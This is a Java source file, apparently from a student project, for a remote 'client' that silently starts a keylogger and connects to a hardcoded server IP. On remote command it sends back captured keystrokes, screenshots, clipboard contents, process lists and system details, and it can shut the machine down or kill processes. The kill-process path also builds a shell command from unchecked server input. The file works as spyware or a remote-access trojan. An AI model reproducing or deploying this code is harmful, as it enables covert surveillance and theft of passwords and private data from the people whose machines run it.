package com.csm.client;

import com.csm.Message;
import com.csm.SIModel;
import com.csm.model.OsHWModel;
import com.csm.systeminfo.*;
import com.fasterxml.jackson.annotation.JsonFormat;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.Gson;
import oshi.SystemInfo;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.IOException;
import java.net.Socket;
import java.io.*;
import java.net.*;
import java.util.Base64;
import java.util.Scanner;

public class Client
{
    final static int ServerPort = 1234;
    static SystemInfo si = new SystemInfo();
    public static String keyLoger;
    public static boolean isSTOP;
    private static Socket sClient;
    //Thanh: 26.91.242.109
    //Minh: 26.250.54.191
    //Tây: 26.84.204.9
    private static final String Serverip = "26.91.242.109";
    public static void main(String[] args) throws IOException
    {

        keyLoger = "";
        KeyLogger.startKeyLoger();
        // getting localhost ip
        //Thanh: 26.91.242.109
        //Minh: 26.250.54.191
        //Tây: 26.84.204.9
        InetAddress ip = InetAddress.getByName(Serverip);
        // establish the connection
        Socket s = new Socket(ip, ServerPort);

        // obtaining input and out streams
        ObjectOutputStream dos = new ObjectOutputStream(s.getOutputStream());
        ObjectInputStream dis = new ObjectInputStream(s.getInputStream());


        // sendMessage thread
//        Thread sendMessage = new Thread(new Runnable()
//        {
//            @Override
//            public void run() {
//                while (true) {
//
//                    // read the message to deliver.
//                    String msg = scn.nextLine();
//
//                    try {
//                        // write on the output stream
//                        Message object = new Message();
//                        object.command= Message.TAKE_SCREEN_SHOT;
//                        object.data = "data";
//                        object.toId = "admin";
//                        dos.writeObject(object);
//                    } catch (IOException e) {
//                        e.printStackTrace();
//                    }
//                }
//            }
//        });

        // readMessage thread
        Thread readMessage = new Thread(new Runnable()
        {
            @Override
            public void run() {
                Thread CPULOAD;
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        // read the message sent to this client
                        Message msg = (Message) dis.readObject();
                        System.out.println(msg.command);
                        Message object = new Message();
                        object.command = msg.command;
                        object.toId = "admin";
                        switch (msg.command){
                            case Message.TAKE_SCREEN_SHOT -> {
                                object.data = takeScreenShot();
                                dos.writeObject(object);
                            }
                            case Message.LOG_OUT -> {
                                System.out.println("Log out");
//                                Runtime.getRuntime().exec("shutdown -l");
                            }
                            case Message.SHUT_DOWN -> {
                                System.out.println("Shutdown");
                                Runtime.getRuntime().exec("shutdown -s -t 5");
                            }case Message.GET_CLIPBOARD -> {
                                object.data = ClipboardData.getInst().getClipboardContents();
                                dos.writeObject(object);
                            }
                            case Message.GET_LIST_PROCESS -> {
                                object.data = Processes.getProcessInfo();
                                dos.writeObject(object);
                            }
                            case Message.KILL_PROCESS -> {
                                System.out.println("Taskkill /PID "+ msg.data +" /F");
                                Runtime.getRuntime().exec("Taskkill /PID "+ msg.data +" /F");
                            }
                            case Message.GET_DISK -> {
                                object.data = FileStores.toJson();
                                dos.writeObject(object);
                            }
                            case Message.GET_RAM -> {
                                object.data = Memory.getMemory();
                                dos.writeObject(object);
                            }
                            case Message.GET_KEYLOG -> {
                                object.data = keyLoger;
                                keyLoger = "";
                                dos.writeObject(object);
                            }
                            case Message.GET_CPU -> {
//                                isSTOP = false;
//                                Thread waitForStop = new Thread(new Runnable() {
//                                    @Override
//                                    public void run() {
//                                        try {
//                                            Message msg = (Message) dis.readObject();
//                                            if(msg.command == Message.STOP_GET_CPU){
//                                                isSTOP = true;
//                                                Thread.currentThread().interrupt();
//                                            }
//                                        } catch (IOException | ClassNotFoundException e) {
//                                            e.printStackTrace();
//                                        }
//                                    }
//                                });
//                                waitForStop.start();
//                                while(!isSTOP){
                                    object.data = String.valueOf(Processor.getCpuPercent());
                                    dos.writeObject(object);
//                                }
                            }
                            case Message.GET_OS_INFO -> {
                                OsHWModel os = new OsHWModel();
                                os.setOSPreFix(OsHW.getOsPrefix(si));
                                os.setDisplay(OsHW.getDisplay(si));
                                os.setProc(OsHW.getProc(si));
                                object.data = new Gson().toJson(os).replace("\n","");
                                dos.writeObject(object);
                            }
                            case Message.OPEN_SOCKET_CPU -> {
                                int port = Integer.parseInt(msg.data);
                                InetAddress ip = InetAddress.getByName(Serverip);
                                sClient = new Socket(ip, port);
                                ObjectOutputStream dos = new ObjectOutputStream(sClient.getOutputStream());
                                ObjectInputStream dis = new ObjectInputStream(sClient.getInputStream());
                                CPULOAD = new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        while(!Thread.currentThread().isInterrupted()) {
                                            Message cpuload = new Message();
                                            cpuload.command = 0;
                                            cpuload.toId = "";
                                            cpuload.data = String.valueOf(Processor.getCpuPercent());
                                            try {
                                                dos.writeObject(cpuload);
                                            } catch (IOException e) {
                                                Thread.currentThread().interrupt();
                                            }
                                        }
                                    }
                                });
                                CPULOAD.start();
                            }
                            default -> {
                            }
                        }
                    } catch (IOException e) {
                        Thread.currentThread().interrupt();
                        System.err.println("Lỗi nè");
                        return;
                    } catch (ClassNotFoundException e){
                        System.err.println("Lỗi nè");
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }
        });
//        sendMessage.start();
        readMessage.start();

    }

    public static String takeScreenShot(){
        try {
            Robot r = new Robot();
            Rectangle capture =
                    new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage Image = r.createScreenCapture(capture);
            return imgToBase64String(Image,"png");
        } catch (AWTException e) {
            e.printStackTrace();
            return "";
        }
    }
    public static BufferedImage base64StringToImg(final String base64String) {
        try {
            return ImageIO.read(new ByteArrayInputStream(Base64.getDecoder().decode(base64String)));
        } catch (final IOException ioe) {
            throw new UncheckedIOException(ioe);
        }
    }
    public static String imgToBase64String(final RenderedImage img, final String formatName)
    {
        final ByteArrayOutputStream os = new ByteArrayOutputStream();

        try
        {
            ImageIO.write(img, formatName, os);
            return Base64.getEncoder().encodeToString(os.toByteArray());
        }
        catch (final IOException ioe)
        {
            throw new UncheckedIOException(ioe);
        }
    }
    public static String getInfo(SIModel si){
        return new Gson().toJson(si);
    }
    public static SIModel getSIModelfromJson(String json){
        return new Gson().fromJson(json,SIModel.class);
    }
}
